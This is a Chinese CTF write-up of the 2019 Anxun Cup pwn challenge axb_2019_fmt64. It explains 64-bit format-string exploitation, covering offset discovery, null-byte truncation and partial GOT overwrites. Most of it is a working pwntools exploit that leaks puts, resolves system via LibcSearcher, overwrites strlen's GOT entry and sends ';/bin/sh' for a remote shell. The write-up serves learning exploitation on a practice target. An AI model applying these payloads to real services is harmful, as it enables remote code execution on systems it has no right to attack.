格式化字符串，讲点不一样的

64位格式化字符串学习

题目来自2019安洵杯。

这个漏洞原理很简单，就是简单的格式化字符串漏洞,泄露和劫持got表。但是64位呢，和32位有一点点不一样的地方，在这里强调和学习记录一下

直接把我坑傻了顺便学习一下libcsearcher的用法

[*] '/home/l/Desktop/AD/axb_2019_fmt64'

    RELRO:    Partial RELRO

    NX:       NX enabled
    PIE:      No PIE (0x400000)

只开了NX，一看就能写（当我fp)

看一下源码。

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+10h] [rbp-250h]
  char format; // [rsp+120h] [rbp-140h]
  unsigned __int64 v5; // [rsp+258h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts(
    "Hello,I am a computer Repeater updated.\n"
    "After a lot of machine learning,I know that the essence of man is a reread machine!");
  puts("So I'll answer whatever you say!");
  while ( 1 )
  {
    alarm(3u);
    memset(&s, 0, 0x101uLL);
    memset(&format, 0, 0x12CuLL);
    printf("Please tell me:", 0LL);
    read(0, &s, 0x100uLL);
    sprintf(&format, "Repeater:%s\n", &s);
    if ( (unsigned int)strlen(&format) > 0x10E )
      break;
    printf(&format);
  }
  printf("what you input is really long!");
  exit(0);
}

main函数直接告诉你这是一个朴实无华的格式化字符串漏洞。直接输入就能利用。

然后老样子，尝试出了参数是第几个。

Please tell me:AAAA%8$x
Repeater:AAAA41414141

这里提一句：用AAAAAAAA.%p.%p这种方法来测试参数是第几个就不用管寄存器。gdb调试出来的距离栈顶的偏移，记得加上6个寄存器

第8个参数。

然后我尝试了一下,p64(puts_got) + '%8$x'发现，没得用，根本泄露不出来。。。

后来也是找了资料，然后用debug模式调试了一下，发现了玄机。原来，看下面

\x00把我们printf函数截断了。导致不会识别到后面的格式化字符。所以我们要做一点处理。

'%9$xqqqq'+p64(puts_got)把got地址放在格式化字符后面就可以了，但是要记得填充前面为8位，不然不能对齐

然后我兴高采烈的去试了一下，发现还是不行，所以泄露地址要用%s

通了。。。**'%9$sqqqq'+p64(puts_got)**

只要改中间几位就可以了

“%偏移C%$n%” + p64(puts_got+1) + p64(got+2)

然后就是常规的泄露地址，重复利用，覆盖地址。

这里也有些要说的。。。变换有点奇特。

还是上了别人的wp学习一下。

from pwn import * 
from LibcSearcher import LibcSearcher

#p = process('./axb_2019_fmt64')
p = remote("node3.buuoj.cn",25106)
elf = ELF("./axb_2019_fmt64")
#context.log_level = 'debug'
#gdb.attach(p,'b *0x000400957')
puts_got = elf.got["puts"]
strlen_got = elf.got["strlen"]

# 1 
payload = "%9$s" + "aaaa" + p64(puts_got)
p.sendafter("Please tell me:",payload)
print p.recvuntil("Repeater:")
puts_addr = u64(p.recvuntil('\x7f').ljust(8,'\x00'))
log.success("puts_addr ---> " + hex(puts_addr))
# 2
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys = libc_base + libc.dump('system')
binsh = libc_base + libc.dump("str_bin_sh")
log.success("system_addr ---> "+hex(sys))  #打印的目的，就是如果出错，查看是否修改成功。
# 3
#一般修改前三个字节就好。后面的都是一样的，在同一个libc中
sys_high = (sys >> 16) & 0xff
sys_low = sys & 0xffff
log.success('sys---->>'+hex(sys))
log.success('low---->>'+hex(sys_low))
log.success('high---->>'+hex(sys_high))
payload2 = "%" + str(sys_high - 9) + "c%12$hhn" + "%" + str(sys_low - sys_high) + "c%13$hn"
payload2 = payload2.ljust(32,"A") + p64(strlen_got + 2) + p64(strlen_got)

p.sendafter("Please tell me:",payload2)
# 4	
payload3 = ';/bin/sh\x00'
p.sendafter("Please tell me:",payload3)

p.interactive()

这里因为二者地址只有一点不一样，所以只需要修改部分，但是64位有8个字节，所以全改其实有些麻烦，就在这里给出了部分利用。

8*8=64总共有64位，通过>>符号来取中位和低位。

总结

  • 任何函数都要注意地址00截断
  • debug确实看准数据变化
  • got表的覆盖偷懒和模板都在上面了
  • 最后发bin/sh的时候填充了一个分号
